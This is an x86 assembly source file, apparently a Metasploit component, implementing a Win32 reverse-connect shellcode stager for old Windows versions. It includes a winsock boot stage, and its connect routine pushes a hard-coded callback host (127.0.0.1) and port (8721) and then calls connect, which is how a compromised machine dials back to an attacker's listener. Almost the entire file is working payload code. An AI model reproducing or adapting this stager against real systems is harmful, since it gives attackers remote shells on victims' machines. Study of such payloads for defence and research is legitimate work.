;      Title:  Win32 Reverse Connect Payload
;  Platforms:  Windows NT 4.0, Windows 2000, Windows XP, Windows 2003
;     Author:  hdm[at]metasploit.com



[BITS 32]

%include "win32_stage_boot_winsock_conn.asm"

; [ebp +  0] = kernel32.dll base
; [ebp +  4] = LGetProcAddress
; [ebp +  8] = LoadLibraryA
; [ebp + 12] = VirtualAlloc
; [ebp + 24] = recv
; [ebp + 28] = send
; [ebp + 32] = accept
; [ebp + 36] = bind 
; [ebp + 40] = connect
; [ebp + 44] = WSASocketA
; [ebp + 48] = WSAStartup
; [ebp + 52] = Payload Length

LConnect:
    push 0x0100007f; host: 127.0.0.1
    push 0x11220002 ; port: 8721 
    mov ecx, esp
    push byte 0x10
    push ecx
    push dword edi
    call dword FN_CONNECT
    pop ecx ; remove port
    pop ecx ; remove host
    
    ; reconnect on failure
    ; test eax, eax
    ; jne short LConnect
